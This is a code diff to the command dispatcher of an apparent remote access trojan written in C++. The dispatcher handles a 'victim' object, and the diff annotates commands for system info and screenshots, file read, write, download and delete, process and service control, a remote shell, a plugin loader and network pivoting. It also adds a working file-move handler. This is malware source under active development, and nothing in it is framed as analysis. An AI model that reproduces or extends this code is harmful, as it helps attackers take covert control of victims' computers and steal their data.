@@ -57,8 +57,6 @@ void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vuMsg)
     if (vuMsg.size() == 0)
         return;
 
-    clsDebugTools::fnPrintStringList(vuMsg);
-
     std::vector<std::string> vsMsg;
     if (vuMsg[0].rfind("Hacked_", 0) == 0)
     {
@@ -92,7 +90,7 @@ void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vuMsg)
         vsMsg.insert(vsMsg.end(), vuMsg.begin(), vuMsg.end());
     }
 
-    if (vsMsg[0] == "info")
+    if (vsMsg[0] == "info") //Information.
     {
         clsInfoSpyder spy;
         clsScreenshot screen;
@@ -123,11 +121,11 @@ void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vuMsg)
         victim.fnSendCommand(vsInfo);
 
     }
-    else if (vsMsg[0] == "file")
+    else if (vsMsg[0] == "file") //File Manager.
     {
         clsFileMgr fileMgr;
 
-        if (vsMsg[1] == "init")
+        if (vsMsg[1] == "init") //Initialization.
         {
             std::vector<std::string> vsMsg = {
                 "file",
@@ -137,7 +135,7 @@ void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vuMsg)
 
             victim.fnSendCommand(vsMsg);
         }
-        else if (vsMsg[1] == "sd")
+        else if (vsMsg[1] == "sd") //Scan directory.
         {
             auto ls = fileMgr.fnScandir(vsMsg[2]);
             std::vector<std::vector<std::string>> v2d;
@@ -166,7 +164,7 @@ void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vuMsg)
 
             victim.fnSendCommand(vuMsg);
         }
-        else if (vsMsg[1] == "wf")
+        else if (vsMsg[1] == "wf") //Write file.
         {
             std::string szFilePath = vsMsg[2];
             std::string szFileContent = vsMsg[3];
@@ -183,7 +181,7 @@ void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vuMsg)
 
             victim.fnSendCommand(ls);
         }
-        else if (vsMsg[1] == "rf")
+        else if (vsMsg[1] == "rf") //Read file.
         {
             std::string szFilePath = vsMsg[2];
 
@@ -200,7 +198,7 @@ void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vuMsg)
 
             victim.fnSendCommand(ls);
         }
-        else if (vsMsg[1] == "goto")
+        else if (vsMsg[1] == "goto") //Check directory's existence.
         {
             std::string szPath = vsMsg[2];
             bool bExist = fileMgr.fnbDirExists(szPath);
@@ -215,7 +213,7 @@ void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vuMsg)
 
             victim.fnSendCommand(ls);
         }
-        else if (vsMsg[1] == "df")
+        else if (vsMsg[1] == "df") //Download file.
         {
             std::string szFilePath = vsMsg[2];
             size_t nChunk = atoi(vsMsg[3].data());
@@ -229,15 +227,15 @@ void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vuMsg)
 
             thDownload.join();
         }
-        else if (vsMsg[1] == "uf")
+        else if (vsMsg[1] == "uf") //Upload file.
         {
 
         }
-        else if (vsMsg[1] == "wget")
+        else if (vsMsg[1] == "wget") //WGET.
         {
 
         }
-        else if (vsMsg[1] == "del")
+        else if (vsMsg[1] == "del") //Delete.
         {
             STR szPath = vsMsg[2];
             auto[nCode, szMsg] = fileMgr.fntpDelete(szPath);
@@ -250,7 +248,7 @@ void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vuMsg)
 
             victim.fnSendCommand(ls);
         }
-        else if (vsMsg[1] == "cp")
+        else if (vsMsg[1] == "cp") //Copy.
         {
             STR szSrcPath = vsMsg[2];
             STR szDstPath = vsMsg[3];
@@ -266,11 +264,23 @@ void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vuMsg)
 
             victim.fnSendCommand(ls);
         }
-        else if (vsMsg[1] == "mv")
+        else if (vsMsg[1] == "mv") //Move.
         {
+            STR szSrcPath = vsMsg[2];
+            STR szDstPath = vsMsg[3];
 
+            auto[nCode, szMsg] = fileMgr.fntpMove(szSrcPath, szDstPath);
+
+            STRLIST ls = {
+                std::to_string(nCode),
+                szSrcPath,
+                szDstPath,
+                szMsg,
+            };
+
+            victim.fnSendCommand(ls);
         }
-        else if (vsMsg[1] == "img")
+        else if (vsMsg[1] == "img") //Get image base64.
         {
             std::string szFilePath = vsMsg[2];
             BUFFER abBuffer = fileMgr.fnabReadImage(szFilePath);
@@ -301,7 +311,7 @@ void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vuMsg)
             victim.fnSendCommand(ls);
         }
     }
-    else if (vsMsg[0] == "proc")
+    else if (vsMsg[0] == "proc") //Process Manager.
     {
         clsProcMgr procMgr;
 
@@ -310,7 +320,7 @@ void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vuMsg)
 
         }
     }
-    else if (vsMsg[0] == "srv")
+    else if (vsMsg[0] == "srv") //Service Manager.
     {
         clsServMgr srvMgr;
 
@@ -342,7 +352,7 @@ void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vuMsg)
             victim.fnSendCommand(vsMsg);
         }
     }
-    else if (vsMsg[0] == "shell")
+    else if (vsMsg[0] == "shell") //Remote Shell.
     {
         if (vsMsg[1] == "start")
         {
@@ -357,11 +367,11 @@ void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vuMsg)
             std::string szOutput = clsTools::fnExec(vsMsg[2]);
         }
     }
-    else if (vsMsg[0] == "loader")
+    else if (vsMsg[0] == "loader") //Plugin Loader.
     {
 
     }
-    else if (vsMsg[0] == "server")
+    else if (vsMsg[0] == "server") //Pivoting.
     {
         if (vsMsg[1] == "start")
         {
